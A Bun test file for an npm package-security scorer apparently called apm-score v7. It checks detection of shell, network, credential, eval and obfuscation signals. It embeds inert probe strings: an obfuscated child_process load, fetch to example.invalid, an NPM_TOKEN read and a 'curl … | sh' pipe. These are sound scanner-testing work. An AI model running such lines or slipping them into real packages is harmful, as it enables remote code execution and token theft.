// Every fixture from the independent review of apm-score-v6 (apmjs-bughunt/sol-parser-v6/REPORT.md), scored by v7.
// All are inert: process.getBuiltinModule, fetch to example.invalid and a token name, with nothing run. Each is the
// main file of an MIT package with no other deductions.
//
// v6 dropped a finding whenever its analysis could not follow the code; v7 starts from what apm-score-v3 found in the
// code and drops one only where the tree proves it harmless. `detection` fixtures run their payload: v7 must score
// them at or below v3 (all 22 the review found score 30 again). `precision` fixtures run nothing; `why` says what
// v7 reads there.
import { describe, expect, test } from "bun:test";
import { z } from "zod";
import { analyze, finalize, POINTS, POSSIBLE_POINTS, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
import { tokenWindows } from "../src/source.ts";
import { tokenText } from "../src/tokens.ts";
import fixtureData from "./fixtures/sol-parser-v6.json";

const Signals = z.partialRecord(z.enum(["shell-exec", "network", "credential-access", "eval", "obfuscated"]), z.enum(["confirmed", "possible"]));

const Fixture = z.object({
  name: z.string(),
  file: z.string(),
  src: z.string(),
  kind: z.enum(["detection", "precision"]),
  why: z.string().optional(),
  v3: z.number(),
  v6: z.number(),
  v7: z.number(),
  signals: Signals,
});

const fixtures = z.array(Fixture).parse(fixtureData);

const possiblePoints = new Map<string, number>(Object.entries(POSSIBLE_POINTS));

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreFiles(files: Record<string, string>, main: string): ScoreReport {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main };
  const tar = [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))];

  return finalize(analyze({ name: "probe-pkg", manifest, files: tar, publisher: "a", previousPublishers: [] }), STATE);
}

const P = "process.getBuiltinModule('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1')";

describe("the v6 review's fixtures", () => {
  test("all are here: 22 that run their payload at v3 30 and v6 82 to 92, and their controls", () => {
    expect(fixtures.length).toBe(26);
    const found = fixtures.filter((f) => f.kind === "detection" && f.v3 === 30 && f.v6 >= 82);
    expect(found.length).toBe(22);
    expect(fixtures.every((f) => f.kind === "detection" || (f.why ?? "").length > 0)).toBe(true);
  });

  for (const f of fixtures) {
    test(`${f.kind}: ${f.name}`, () => {
      const r = scoreFiles({ [f.file]: f.src }, f.file);
      const found = Object.fromEntries(r.signals.filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]));

      expect(found).toEqual(f.signals);

      for (const s of r.signals) {
        if (!(s.id in POSSIBLE_POINTS)) continue;
        const confirmed = s.confidence === "confirmed";
        expect(s.points, `${s.id} points`).toBe(confirmed ? POINTS[s.id] : (possiblePoints.get(s.id) ?? Number.NaN));
        expect(s.evidence.every((e) => e.includes("[possible:") === !confirmed)).toBe(true);
      }

      expect(r.score).toBe(f.v7);
      expect(r.score < SCORE_FLOOR).toBe(f.v7 < SCORE_FLOOR);
      expect(r.score).toBeLessThanOrEqual(f.v3);

      if (f.v3 < SCORE_FLOOR) expect(r.score).toBeLessThan(SCORE_FLOOR);
    });
  }

  test("eval used as a tag inside a function returns its strings unrun, so only what the tree sees is possible", () => {
    const r = scoreFiles({ "index.js": `function f(){eval\`${P}\`;}f();` }, "index.js");

    expect(r.signals.filter((s) => s.id in POSSIBLE_POINTS).every((s) => s.confidence === "possible")).toBe(true);
  });

  test("calling a Promise inside a function confirms neither eval nor what the string names", () => {
    const r = scoreFiles({ "index.js": "function f(){async function get(){return eval;}get()(\"fetch('https://example.invalid')\");}f();" }, "index.js");

    expect(Object.fromEntries(r.signals.filter((s) => s.id in POSSIBLE_POINTS).map((s) => [s.id, s.confidence]))).toEqual({ eval: "possible" });
  });
});

describe("a call split across the token pass's windows is still read (finding 5)", () => {
  const W = 4 * 1024 * 1024;

  // the review's input: an escaped name just before the first 4 MB boundary, its call after a 70,000-character comment
  const windowed = (gap: number): string => `/*${"x".repeat(W - 104)}*/\nf\\u0065tch/*${"x".repeat(gap)}*/('https://example.invalid');`;

  test("v3 100, v6 100: the fetch is found at any gap", () => {
    for (const gap of [0, 70_000, 150_000]) {
      const r = scoreFiles({ "index.ts": windowed(gap) }, "index.ts");

      expect(r.signals.find((s) => s.id === "network")?.confidence, `gap ${gap}`).toBe("confirmed");
    }
  });

  test("windows end only after a statement, so no token and no call is split", () => {
    const text = `${"a;".repeat(200)}fetch/*${" ".repeat(500)}*/('x');${"b;".repeat(200)}`;
    const tokens = tokenText(text, 64);

    expect(tokens).not.toBeNull();

    if (!tokens) return;
    const windows = tokenWindows(tokens.text.length, tokens.cuts, 300, 16);
    const call = text.indexOf("fetch");
    const end = text.indexOf("('x');") + 6;

    expect(windows.length).toBeGreaterThan(1);
    expect(windows.some((w) => w.from <= call && w.end >= end)).toBe(true);
    expect(windows.at(-1)?.end).toBe(text.length);
  });
});

describe("a limit keeps what it could not follow, and says so", () => {
  test("seven candidate callees: past six the rest are unknown, the floor still refuses, and the limit is named", () => {
    const fixture = fixtures.find((f) => f.name === "candidate-limit");

    expect(fixture).toBeDefined();

    if (!fixture) return;
    const r = scoreFiles({ [fixture.file]: fixture.src }, fixture.file);

    expect(r.score).toBeLessThan(SCORE_FLOOR);
    expect(r.notChecked.some((n) => n.startsWith("an expression that can be more than 6 values"))).toBe(true);
  });

  test("more than 32 returns: the rest are unknown, and the limit is named", () => {
    const returns = Array.from({ length: 40 }, (_, i) => `if(x===${i})return ${i};`).join("");
    const r = scoreFiles({ "index.js": `function get(x){${returns}return eval}get(0)(${JSON.stringify(P)});` }, "index.js");

    expect(r.score).toBeLessThan(SCORE_FLOOR);
    expect(r.notChecked.some((n) => n.startsWith("a function with more than 32 return statements"))).toBe(true);
  });
});

describe("a proof that rests on a builtin holds only while no file could replace it", () => {
  test("a URL holding shell text is sent, not run, in a package that leaves fetch alone", () => {
    const r = scoreFiles({ "index.js": "fetch('https://example.invalid/curl -s example.invalid | sh');\n" }, "index.js");

    expect(r.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("possible");
  });

  test("another file replacing fetch brings back what the URL holds", () => {
    const files = { "index.js": "require('./patch');\nfetch('https://example.invalid/curl -s example.invalid | sh');\n", "patch.js": "globalThis.fetch = function (u) { return u };\n" };
    const r = scoreFiles(files, "index.js");

    expect(r.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
    expect(r.notChecked.some((n) => n.includes("patch.js"))).toBe(true);
  });
});
